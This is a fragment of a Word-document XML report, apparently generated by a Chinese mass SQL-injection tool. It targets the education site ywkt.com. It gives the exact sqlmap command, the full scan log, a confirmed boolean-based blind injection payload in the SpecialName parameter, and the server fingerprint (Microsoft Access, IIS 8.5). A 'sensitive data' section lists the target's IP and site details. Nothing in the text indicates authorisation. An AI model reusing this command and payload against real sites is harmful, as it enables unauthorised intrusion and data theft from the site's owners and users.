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注入网址:http://ywkt.com/default.asp?page=2^&amp;BigClassName=^&amp;SmallClassName=^&amp;SpecialName=^&amp;Action=^&amp;keyword=</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">执行命令:python sqlmap.py -u http://ywkt.com/default.asp?page=2^&amp;BigClassName=^&amp;SmallClassName=^&amp;SpecialName=^&amp;Action=^&amp;keyword= --random-agent --dbs  --current-user --current-db --is-db </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:br/>
        <w:br/>
        <w:t>注入参数(方式) : SpecialName (GET)</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    注入方式 : boolean-based blind</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    注入标题 : AND boolean-based blind - WHERE or HAVING clause</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    注入攻击 : page=2&amp;BigClassName=&amp;SmallClassName=&amp;SpecialName=' AND 1041=1041 AND 'kXvd'='kXvd&amp;Action=&amp;keyword=</w:t>
        <w:br/>
        <w:br/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t>数据库类型 : Microsoft Access</w:t>
        <w:br/>
        <w:br/>
        <w:t>服务器版本 : Windows 8.1 or 2012 R2</w:t>
        <w:br/>
        <w:br/>
        <w:t>服务器语言 : ASP.NET, Microsoft IIS 8.5, ASP</w:t>
        <w:br/>
        <w:br/>
        <w:t>数据库版本 : Microsoft Access</w:t>
        <w:br/>
        <w:br/>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Subtitle"/>
      </w:pPr>
      <w:r>
        <w:t>网站信息报表</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t>百度权重  4</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t>网站主页  http://ywkt.com</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语文课堂网--首页</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">IP__坐标  北美地区  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t>所属__IP  107.151.82.178</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t>网站年龄  12年4月13天（创建于2006年12月20日,过期时间为2024年12月20日)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36万5000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t>协议类型  HTTP/1.1 200 OK</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">页面类型   text/html  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">服务类型   Microsoft-IIS/8.5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http://ywkt.com/default.asp?page=2^&amp;BigClassName=^&amp;SmallClassName=^&amp;SpecialName=^&amp;Action=^&amp;keyword= --random-agent --dbs  --current-user --current-db --is-db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00:37:21 /2019-05-03/</w:t>
        <w:br/>
        <w:br/>
        <w:br/>
        <w:br/>
        <w:t>[00:37:21] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows; U; Windows NT 6.0; fr-FR) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16' from file 'D:\HACKER_TOOLS\LANGZI_HACKER\LANGZI_SQL_INJECTION\Auto_ExtrAct_1.0\sqlmap\txt\user-agents.txt'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:37:21] [WARNING] provided value for parameter 'BigClassName' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:37:21] [WARNING] provided value for parameter 'SmallClassName' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:37:21] [WARNING] provided value for parameter 'SpecialName' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:37:21] [WARNING] provided value for parameter 'Action' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:37:21] [WARNING] provided value for parameter 'keyword' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:37:21] [INFO] testing connection to the target URL</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:37:22] [INFO] checking if the target is protected by some kind of WAF/IPS</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:37:22] [INFO] testing if the target URL content is stable</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:37:23] [INFO] target URL content is stable</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:37:23] [INFO] testing if GET parameter 'page' is dynamic</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:37:24] [INFO] GET parameter 'page' appears to be dynamic</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:37:24] [INFO] heuristics detected web page charset 'utf-8'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:37:24] [WARNING] heuristic (basic) test shows that GET parameter 'page' might not be injectable</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:37:24] [INFO] testing for SQL injection on GET parameter 'page'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:37:24] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:37:25] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:37:25] [INFO] testing 'MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:37:26] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:37:26] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:37:27] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:37:27] [INFO] testing 'MySQL &gt;= 5.0 error-based - Parameter replace (FLOOR)'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:37:27] [INFO] testing 'MySQL inline queries'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:37:27] [INFO] testing 'PostgreSQL inline queries'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:37:27] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:37:27] [INFO] testing 'PostgreSQL &gt; 8.1 stacked queries (comment)'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:37:28] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:37:28] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:37:29] [INFO] testing 'MySQL &gt;= 5.0.12 AND time-based blind'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:37:29] [INFO] testing 'PostgreSQL &gt; 8.1 AND time-based blind'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:37:30] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:37:30] [INFO] testing 'Oracle AND time-based blind'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:37:30] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:37:36] [WARNING] GET parameter 'page' does not seem to be injectable</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:37:36] [INFO] testing if GET parameter 'BigClassName' is dynamic</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:37:37] [INFO] GET parameter 'BigClassName' appears to be dynamic</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:37:37] [WARNING] heuristic (basic) test shows that GET parameter 'BigClassName' might not be injectable</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:37:37] [INFO] testing for SQL injection on GET parameter 'BigClassName'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:37:37] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:37:38] [WARNING] reflective value(s) found and filtering out</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:37:42] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:37:43] [INFO] testing 'MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:37:44] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:37:46] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:37:48] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:37:49] [INFO] testing 'MySQL &gt;= 5.0 error-based - Parameter replace (FLOOR)'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:37:50] [INFO] testing 'MySQL inline queries'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:37:50] [INFO] testing 'PostgreSQL inline queries'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:37:51] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:37:51] [INFO] testing 'PostgreSQL &gt; 8.1 stacked queries (comment)'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:37:53] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:37:53] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:37:54] [INFO] testing 'MySQL &gt;= 5.0.12 AND time-based blind'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:37:56] [INFO] testing 'PostgreSQL &gt; 8.1 AND time-based blind'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:37:58] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:37:58] [INFO] testing 'Oracle AND time-based blind'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:38:00] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:38:20] [WARNING] GET parameter 'BigClassName' does not seem to be injectable</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:38:20] [INFO] testing if GET parameter 'SmallClassName' is dynamic</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:38:21] [WARNING] GET parameter 'SmallClassName' does not appear to be dynamic</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:38:22] [WARNING] heuristic (basic) test shows that GET parameter 'SmallClassName' might not be injectable</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:38:22] [INFO] heuristic (XSS) test shows that GET parameter 'SmallClassName' might be vulnerable to cross-site scripting (XSS) attacks</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:38:22] [INFO] testing for SQL injection on GET parameter 'SmallClassName'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:38:22] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:38:30] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:38:31] [INFO] testing 'MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:38:35] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:38:39] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:38:42] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:38:46] [INFO] testing 'MySQL &gt;= 5.0 error-based - Parameter replace (FLOOR)'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:38:47] [INFO] testing 'MySQL inline queries'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:38:47] [INFO] testing 'PostgreSQL inline queries'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:38:48] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:38:49] [INFO] testing 'PostgreSQL &gt; 8.1 stacked queries (comment)'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:38:51] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:38:54] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:38:57] [INFO] testing 'MySQL &gt;= 5.0.12 AND time-based blind'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:39:00] [INFO] testing 'PostgreSQL &gt; 8.1 AND time-based blind'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:39:03] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:39:07] [INFO] testing 'Oracle AND time-based blind'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:39:10] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:39:53] [WARNING] GET parameter 'SmallClassName' does not seem to be injectable</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:39:53] [INFO] testing if GET parameter 'SpecialName' is dynamic</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:39:54] [INFO] GET parameter 'SpecialName' appears to be dynamic</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:39:54] [WARNING] heuristic (basic) test shows that GET parameter 'SpecialName' might not be injectable</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:39:54] [INFO] testing for SQL injection on GET parameter 'SpecialName'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:39:54] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:39:59] [INFO] GET parameter 'SpecialName' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="32288")</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:40:00] [INFO] testing 'MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:40:01] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:40:01] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:40:01] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:40:01] [INFO] testing 'MySQL &gt;= 5.0 error-based - Parameter replace (FLOOR)'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:40:01] [INFO] testing 'MySQL inline queries'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:40:01] [INFO] testing 'PostgreSQL inline queries'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:40:02] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:40:02] [INFO] testing 'PostgreSQL &gt; 8.1 stacked queries (comment)'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:40:03] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:40:03] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:40:03] [INFO] testing 'MySQL &gt;= 5.0.12 AND time-based blind'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:40:03] [INFO] testing 'PostgreSQL &gt; 8.1 AND time-based blind'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:40:03] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:40:03] [INFO] testing 'Oracle AND time-based blind'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:40:03] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:40:03] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:40:06] [INFO] checking if the injection point on GET parameter 'SpecialName' is a false positive</w:t>
        <w:br/>
        <w:br/>
        <w:t>GET parameter 'SpecialName' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N</w:t>
        <w:br/>
        <w:br/>
        <w:t>sqlmap identified the following injection point(s) with a total of 448 HTTP(s) requests:</w:t>
        <w:br/>
        <w:br/>
        <w:t>---</w:t>
        <w:br/>
        <w:br/>
        <w:t>Parameter: SpecialName (GET)</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    Type: boolean-based blind</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    Title: AND boolean-based blind - WHERE or HAVING clause</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    Payload: page=2&amp;BigClassName=&amp;SmallClassName=&amp;SpecialName=' AND 1041=1041 AND 'kXvd'='kXvd&amp;Action=&amp;keyword=</w:t>
        <w:br/>
        <w:br/>
        <w:t>---</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:40:12] [INFO] testing MySQL</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:40:12] [WARNING] the back-end DBMS is not MySQL</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:40:12] [INFO] testing Oracle</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:40:12] [WARNING] the back-end DBMS is not Oracle</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:40:12] [INFO] testing PostgreSQL</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:40:12] [WARNING] the back-end DBMS is not PostgreSQL</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:40:12] [INFO] testing Microsoft SQL Server</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:40:13] [WARNING] the back-end DBMS is not Microsoft SQL Server</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:40:13] [INFO] testing SQLite</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:40:13] [WARNING] the back-end DBMS is not SQLite</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:40:13] [INFO] testing Microsoft Access</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:40:14] [INFO] confirming Microsoft Access</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:40:14] [INFO] the back-end DBMS is Microsoft Access</w:t>
        <w:br/>
        <w:br/>
        <w:t>web server operating system: Windows 8.1 or 2012 R2</w:t>
        <w:br/>
        <w:br/>
        <w:t>web application technology: ASP.NET, Microsoft IIS 8.5, ASP</w:t>
        <w:br/>
        <w:br/>
        <w:t>back-end DBMS: Microsoft Access</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:40:14] [WARNING] on Microsoft Access it is not possible to enumerate the current user</w:t>
        <w:br/>
        <w:br/>
        <w:t>current user:</w:t>
        <w:tab/>
        <w:t>None</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:40:14] [WARNING] on Microsoft Access it is not possible to get name of the current database</w:t>
        <w:br/>
        <w:br/>
        <w:t>current database:</w:t>
        <w:tab/>
        <w:t>None</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:40:14] [WARNING] on Microsoft Access it is not possible to test if current user is DBA</w:t>
        <w:br/>
        <w:br/>
        <w:t>current user is DBA:</w:t>
        <w:tab/>
        <w:t>None</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:40:14] [WARNING] on Microsoft Access it is not possible to enumerate databases (use only '--tables')</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:40:14] [WARNING] HTTP error codes detected during run:</w:t>
        <w:br/>
        <w:br/>
        <w:t>500 (Internal Server Error) - 235 times</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:40:14] [INFO] fetched data logged to text files under 'C:\Users\langzi\.sqlmap\output\ywkt.com'</w:t>
        <w:br/>
        <w:br/>
        <w:br/>
        <w:br/>
        <w:t>[*] ending @ 00:40:14 /2019-05-03/</w:t>
        <w:br/>
        <w:br/>
        <w:br/>
        <w:br/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="DaHei"/>
      </w:pPr>
      <w:r>
        <w:t>敏感数据</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHOng"/>
      </w:pPr>
      <w:r>
        <w:br/>
        <w:br/>
        <w:t>注入参数(方式) : SpecialName (GET)</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    注入方式 : boolean-based blind</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    注入标题 : AND boolean-based blind - WHERE or HAVING clause</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    注入攻击 : page=2&amp;BigClassName=&amp;SmallClassName=&amp;SpecialName=' AND 1041=1041 AND 'kXvd'='kXvd&amp;Action=&amp;keyword=</w:t>
        <w:br/>
        <w:br/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHOng"/>
      </w:pPr>
      <w:r>
        <w:t>数据库类型 : Microsoft Access</w:t>
        <w:br/>
        <w:br/>
        <w:t>服务器版本 : Windows 8.1 or 2012 R2</w:t>
        <w:br/>
        <w:br/>
        <w:t>服务器语言 : ASP.NET, Microsoft IIS 8.5, ASP</w:t>
        <w:br/>
        <w:br/>
        <w:t>数据库版本 : Microsoft Access</w:t>
        <w:br/>
        <w:br/>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